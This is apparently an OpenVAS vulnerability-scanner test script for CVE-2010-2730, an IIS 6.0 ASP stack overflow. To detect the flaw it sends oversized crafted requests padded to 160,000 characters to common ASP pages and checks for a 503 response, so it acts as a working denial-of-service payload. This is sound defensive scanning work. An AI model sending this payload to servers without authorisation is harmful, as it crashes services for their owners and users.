###############################################################################
# OpenVAS Vulnerability Test
#
# Microsoft IIS ASP Stack Based Buffer Overflow Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (C) 2010 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:microsoft:internet_information_services";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801520");
  script_version("2022-12-05T10:11:03+0000");
  script_tag(name:"last_modification", value:"2022-12-05 10:11:03 +0000 (Mon, 05 Dec 2022)");
  script_tag(name:"creation_date", value:"2010-10-08 08:29:14 +0200 (Fri, 08 Oct 2010)");
  script_cve_id("CVE-2010-2730");
  script_tag(name:"cvss_base", value:"9.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");
  script_name("Microsoft IIS ASP Stack Based Buffer Overflow Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_family("Web Servers");
  script_dependencies("secpod_ms_iis_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("IIS/installed");

  script_xref(name:"URL", value:"http://bug.zerobox.org/show-2780-1.html");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/43138");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/15167/");
  script_xref(name:"URL", value:"http://www.deltadefensesystems.com/blog/?p=217");
  script_xref(name:"URL", value:"https://docs.microsoft.com/en-us/security-updates/securitybulletins/2010/ms10-065");

  script_tag(name:"impact", value:"Successful exploitation will let the remote unauthenticated attackers to force
  the IIS server to become unresponsive until the IIS service is restarted manually by the administrator.");

  script_tag(name:"affected", value:"Microsoft Internet Information Services version 6.0.");

  script_tag(name:"insight", value:"The flaw is due to a stack overflow error in the in the IIS worker
  process which can be exploited using a crafted POST request to hosted 'ASP' pages.");

  script_tag(name:"solution", value:"The vendor has released updates. Please see the references for more information.");

  script_tag(name:"summary", value:"Microsoft IIS Webserver is prone to stack based buffer overflow vulnerability.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! get_app_location( cpe:CPE, port:port, nofork:TRUE ) )
  exit( 0 );

host = http_host_name( port:port );

foreach file( make_list( "/login.asp", "/index.asp", "/default.asp" ) ) {

  for( i = 0; i < 10; i++ ) {

    string = crap( data:"C=A&", length:160000 );

    req = string("HEAD ", file, " HTTP/1.1 \r\n",
                 "Host: ", host, "\r\n",
                 "Connection:Close \r\n",
                 "Content-Type: application/x-www-form-urlencoded \r\n",
                 "Content-Length:", strlen( string ),"\r\n\r\n", string);
    res = http_send_recv( port:port, data:req );

    if( ereg( pattern:"^HTTP/1\.[01] 503", string:res ) &&
        ( "Service Unavailable" >< res ) ) {
      report = http_report_vuln_url( port:port, url:file );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );
